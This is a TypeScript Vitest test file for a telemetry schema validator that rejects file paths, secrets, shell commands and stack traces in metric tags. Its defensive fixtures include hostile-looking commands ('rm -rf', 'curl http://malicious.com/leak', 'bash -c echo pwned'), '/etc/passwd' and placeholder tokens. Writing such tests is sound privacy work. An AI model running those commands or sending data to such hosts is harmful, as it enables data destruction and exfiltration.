import { describe, expect, it } from "vitest";
import {
  ALLOWED_TAG_KEYS,
  SchemaGuard,
  SchemaGuardValidationError,
} from "../../src/analytics/schema-guard.js";
import type { TelemetryBatchRequest } from "../../src/analytics/types.js";

describe("SchemaGuard: Privacy-Safe Dimension & Telemetry Validation", () => {
  const baseValidBatch: TelemetryBatchRequest = {
    batchId: "batch_valid_001",
    deviceId: "dev_valid_001",
    installationId: "inst_valid_001",
    workspaceId: "ws_valid_001",
    timestamp: new Date().toISOString(),
    metrics: [
      {
        metricName: "tool.execution_duration_ms",
        value: 124.5,
        unit: "ms",
        tags: {
          toolId: "git_diff_tool",
          version: "1.2.0",
          status: "success",
          environment: "production",
          platform: "linux",
          arch: "x64",
          shadowRun: false,
        },
        timestamp: new Date().toISOString(),
      },
    ],
    invocations: [
      {
        invocationId: "inv_valid_001",
        sessionId: "sess_001",
        workspaceId: "ws_valid_001",
        toolId: "git_diff_tool",
        toolVersion: "1.2.0",
        startedAt: new Date(Date.now() - 200).toISOString(),
        completedAt: new Date().toISOString(),
        durationMs: 200,
        status: "success",
        inputDigest: "a".repeat(64),
        outputDigest: "b".repeat(64),
        resourceUsage: {
          cpuTimeMs: 15,
          memoryBytes: 1024 * 1024,
          shadowRun: false,
        },
      },
    ],
  };

  it("should validate a compliant telemetry batch without errors", () => {
    expect(() => SchemaGuard.validateBatch(baseValidBatch)).not.toThrow();
  });

  describe("Dimension Allowlist Enforcement", () => {
    it("should allow known operational dimensions", () => {
      const allowedKeys = [
        "toolId",
        "version",
        "status",
        "environment",
        "platform",
        "arch",
        "errorCode",
      ];
      for (const key of allowedKeys) {
        const check = SchemaGuard.isAllowedDimension(key, "standard_value");
        expect(check.allowed).toBe(true);
      }
    });

    it("should reject arbitrary, unallowed dimension keys", () => {
      const forbiddenKeys = [
        "user_prompt",
        "custom_code",
        "file_content",
        "query_string",
        "arbitrary_payload",
        "debug_log",
      ];
      for (const key of forbiddenKeys) {
        const check = SchemaGuard.isAllowedDimension(key, "some_value");
        expect(check.allowed).toBe(false);
        expect(check.reason).toContain("not in the telemetry allowlist");
      }
    });

    it("should throw SchemaGuardValidationError when batch contains unallowed dimension key", () => {
      const batchWithInvalidKey: TelemetryBatchRequest = {
        ...baseValidBatch,
        metrics: [
          {
            metricName: "tool.invocation",
            value: 1,
            tags: {
              toolId: "my_tool",
              unauthorized_custom_dim: "leak_attempt",
            },
            timestamp: new Date().toISOString(),
          },
        ],
      };

      expect(() => SchemaGuard.validateBatch(batchWithInvalidKey)).toThrow(
        SchemaGuardValidationError,
      );
    });
  });

  describe("Filesystem Path Rejection", () => {
    it("should reject Linux / Unix file paths in dimension values", () => {
      const paths = [
        "/home/developer/project/secret.ts",
        "/Users/alice/Work/confidential.json",
        "/var/log/app.log",
        "/tmp/dump.dat",
        "/etc/passwd",
      ];

      for (const path of paths) {
        const check = SchemaGuard.isAllowedDimension("toolId", path);
        expect(check.allowed).toBe(false);
        expect(check.reason).toContain("Filesystem path detected");
      }
    });

    it("should reject Windows file paths and file URIs", () => {
      const windowsPaths = [
        "C:\\Users\\Bob\\Documents\\keys.txt",
        "D:\\data\\workspace\\secret.env",
        "file:///home/user/code.js",
        "../parent/relative.ts",
      ];

      for (const path of windowsPaths) {
        const check = SchemaGuard.isAllowedDimension("toolId", path);
        expect(check.allowed).toBe(false);
      }
    });
  });

  describe("Shell Commands & CLI Execution Rejection", () => {
    it("should reject dangerous shell commands in dimension values", () => {
      const commands = [
        "rm -rf /tmp/data",
        "sudo apt update",
        "chmod +x script.sh",
        "curl http://malicious.com/leak",
        "bash -c echo pwned",
        "git commit -m 'secret'",
        "eval(code)",
      ];

      for (const cmd of commands) {
        const check = SchemaGuard.isAllowedDimension("errorCode", cmd);
        expect(check.allowed).toBe(false);
        expect(check.reason).toBeDefined();
      }
    });
  });

  describe("Secrets & Credentials Rejection", () => {
    it("should reject Bearer tokens and OpenAI API keys", () => {
      const secrets = [
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-IDcSemACt8x4iTMCda8Yhe3iZaWbvV5XKSTbuAn0M",
        "sk-proj-1234567890abcdefghijklmnopqrstuvwxyz",
        "ghp_1234567890abcdefghijklmnopqrstuvwxyz12",
        "AKIAIOSFODNN7EXAMPLE",
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...",
        "api_key=supersecrettoken123",
      ];

      for (const secret of secrets) {
        const check = SchemaGuard.isAllowedDimension("status", secret);
        expect(check.allowed).toBe(false);
      }
    });
  });

  describe("Cardinality & Length Bounds", () => {
    it("should reject dimension values exceeding 128 characters", () => {
      const oversizedValue = "a".repeat(129);
      const check = SchemaGuard.isAllowedDimension("status", oversizedValue);
      expect(check.allowed).toBe(false);
      expect(check.reason).toContain("exceeds maximum allowed length of 128");
    });

    it("should reject multiline dimension values", () => {
      const multiline = "line1\nline2";
      const check = SchemaGuard.isAllowedDimension("status", multiline);
      expect(check.allowed).toBe(false);
      expect(check.reason).toContain("multiline content");
    });

    it("should reject metrics with invalid names or special characters", () => {
      const violations = SchemaGuard.validateMetric({
        metricName: "tool/invocation with spaces!",
        value: 1,
        tags: {},
        timestamp: new Date().toISOString(),
      });
      expect(violations.length).toBeGreaterThan(0);
      expect(violations[0]).toContain("contains invalid characters");
    });
  });

  describe("Invocation Error Details Protection", () => {
    it("should reject invocation errorDetails containing stack traces", () => {
      const batchWithStack: TelemetryBatchRequest = {
        ...baseValidBatch,
        invocations: [
          {
            ...baseValidBatch.invocations[0],
            status: "error",
            errorDetails: {
              errorType: "RuntimeError",
              message: "Execution failed",
              stack: "Error: at /home/user/project/src/index.ts:42:15",
            },
          },
        ],
      };

      expect(() => SchemaGuard.validateBatch(batchWithStack)).toThrow(SchemaGuardValidationError);
    });

    it("should reject invocation errorDetails containing paths in message", () => {
      const batchWithPathInMsg: TelemetryBatchRequest = {
        ...baseValidBatch,
        invocations: [
          {
            ...baseValidBatch.invocations[0],
            status: "error",
            errorDetails: {
              errorType: "FileNotFound",
              message: "Could not open /home/alice/secrets.json",
            },
          },
        ],
      };

      expect(() => SchemaGuard.validateBatch(batchWithPathInMsg)).toThrow(
        SchemaGuardValidationError,
      );
    });
  });
});
